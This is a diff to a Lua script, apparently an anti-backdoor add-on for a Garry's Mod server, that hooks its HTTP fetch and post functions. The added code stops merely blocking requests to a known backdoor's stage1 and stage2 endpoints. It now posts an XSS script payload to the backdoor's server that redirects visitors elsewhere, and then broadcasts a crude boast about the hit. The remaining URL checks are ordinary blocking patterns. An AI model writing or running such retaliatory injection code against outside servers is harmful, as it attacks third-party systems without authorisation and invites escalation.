@@ -185,12 +185,19 @@ end
 RunStringEx = RunString -- They are the same
 
 NBP.httpFetch = http.Fetch
+NBP.httpPost = http.Post
 function http.Fetch( url, os, orr )
-	if string.find(url, "/core/stage1.php") then return end
+	if string.find(url, "/core/stage1.php") then
+		-- GBackdoor fucker (XSS)
+		local surl = string.Replace(url, "/core/stage1.php", "/core/stage2.php")
+		local spl0it = [[<script>window.location.href = "http://www.themostamazingwebsiteontheinternet.com";</script>]]
+		NBP.httpPost(surl, {nb = "1337", i = "1.3.3.7", i = spl0it})
+		NBP.Broadcast("/!\\ Fucked GBackdoor (at %s)", surl)
+	end
 	NBP.httpFetch(url, os, orr)
 end
 
-NBP.httpPost = http.Post
+
 function http.Post( url, param, os, orr )
 	if string.find(url, "/core/stage2.php") then return end
 	NBP.httpPost(url, param, os, orr)
